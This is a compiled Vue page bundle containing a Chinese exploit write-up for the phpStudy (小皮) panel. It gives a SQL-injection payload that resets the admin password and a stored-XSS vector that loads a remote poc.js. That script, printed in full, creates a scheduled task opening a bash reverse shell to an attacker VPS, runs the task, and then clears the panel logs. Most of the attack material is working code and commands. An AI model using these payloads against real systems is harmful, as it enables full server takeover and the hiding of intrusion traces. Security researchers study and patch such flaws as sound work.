import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const p={},e=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>phpStudy 集安全、高效、功能与一体，已获得全球用户认可安装，运维也高效。支持一键 LAMP、LNMP、集群、监控、网站、数据库、FTP、软件中心、伪静态、云备份、SSL、多版本共存、Nginx 反向代理、服务器防火墙、Web 防火墙、监控大屏等服务器管理功能。phpStudy 面板存在存储型 XSS 漏洞，攻击者可以通过 js 调用面板中的计划任务执行系统命令。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>小皮 windows 面板 V0.102 以及以下版本
小皮 linux 面板 X1.29 以及以下版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="方式-1-sql-注入" tabindex="-1"><a class="header-anchor" href="#方式-1-sql-注入" aria-hidden="true">#</a> 方式 1 SQL 注入</h3><p>phpstudy 访问面板登录页面需要添加如下 Headers：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>x-requested-with: XMLHttpRequest
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230519091358703.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在用户登录处构造 Payload，其中 Password 的值是经过五次 md5 加密后的结果，脚本如下：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> hashlib
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">&quot;123456&quot;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>填写 Payload，验证码处需要正确输入：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>admin&#39;;UPDATE ADMINS set PASSWORD = &#39;c26be8aaf53b15054896983b43eb6a65&#39; where username = &#39;admin&#39;;--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>虽然提示错误信息，但此时已经成功将用户名/密码修改为： <code>admin/123456</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230519092040856.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在后台计划任务处创建一个反弹 shell 脚本，点击执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230519092608985.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>服务器端监听，成功接收反弹 Shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230519092655024.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="方式-2-xss" tabindex="-1"><a class="header-anchor" href="#方式-2-xss" aria-hidden="true">#</a> 方式 2 XSS</h3><p>在 VPS 上放置 <a href="#%E6%BC%8F%E6%B4%9EPOC">poc.js</a>，监听 8888 端口，并通过以下命令启动 HTTP 服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 -m http.server 9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在访问面板登录页面用户名处插入 XSS 语句：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;script src=&quot;http://&lt;your-vps-ip&gt;:9999/poc.js&quot;&gt;&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230519100003117.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过方式 1，已经获得了用户名/密码为 admin/123456，进入后台验证一下计划任务是否成功写入：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230519100442704.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>等待 1 分钟，成功接收反弹 Shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230519094345974.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><p>poc.js：</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&#39;/service/app/tasks.php?type=task_list&#39;</span><span class="token punctuation">,</span>   <span class="token comment">//获取计划任务列表</span>
      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">headers</span><span class="token operator">:</span><span class="token punctuation">{</span>
          <span class="token string-property property">&quot;X-Requested-With&quot;</span><span class="token operator">:</span> <span class="token string">&quot;XMLHttpRequest&quot;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">var</span> id <span class="token operator">=</span> data<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token constant">ID</span><span class="token punctuation">;</span>    <span class="token comment">//任务名称</span>
          $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
              <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&#39;/service/app/tasks.php?type=exec_task&#39;</span><span class="token punctuation">,</span>     <span class="token comment">//执行计划任务</span>
              <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">,</span>
              <span class="token literal-property property">headers</span><span class="token operator">:</span><span class="token punctuation">{</span>
                  <span class="token string-property property">&quot;X-Requested-With&quot;</span><span class="token operator">:</span> <span class="token string">&quot;XMLHttpRequest&quot;</span><span class="token punctuation">,</span>
                  <span class="token string-property property">&quot;Content-Type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>
              <span class="token punctuation">}</span><span class="token punctuation">,</span>
              <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">tid</span><span class="token operator">:</span> id <span class="token punctuation">}</span><span class="token punctuation">,</span>
              <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">,</span>
              <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                      <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&#39;/service/app/log.php?type=clearlog&#39;</span><span class="token punctuation">,</span>
                      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">,</span>
                      <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#39;clearlog&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
                      <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">,</span>
                      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
                  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>task_id <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">&#39;test&#39;</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>exec_cycle <span class="token operator">=</span> <span class="token string">&#39;5&#39;</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>week <span class="token operator">=</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>day <span class="token operator">=</span> <span class="token string">&#39;3&#39;</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>hour <span class="token operator">=</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>minute <span class="token operator">=</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">;</span>
  data<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token string">&#39;bash -i &gt;&amp; /dev/tcp/&lt;your-vps-ip&gt;/8888 0&gt;&amp;1&#39;</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">&#39;/service/app/tasks.php?type=save_shell&#39;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">headers</span><span class="token operator">:</span><span class="token punctuation">{</span>
          <span class="token string-property property">&quot;X-Requested-With&quot;</span><span class="token operator">:</span> <span class="token string">&quot;XMLHttpRequest&quot;</span><span class="token punctuation">,</span>
          <span class="token string-property property">&quot;Content-Type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token literal-property property">data</span><span class="token operator">:</span> data<span class="token punctuation">,</span>
      <span class="token literal-property property">dataType</span><span class="token operator">:</span> <span class="token string">&#39;json&#39;</span><span class="token punctuation">,</span>
      <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,32),o=[e];function i(c,l){return s(),a("div",null,o)}const d=n(p,[["render",i],["__file","PHPStudy 后台管理页面 one click RCE.html.vue"]]);export{d as default};
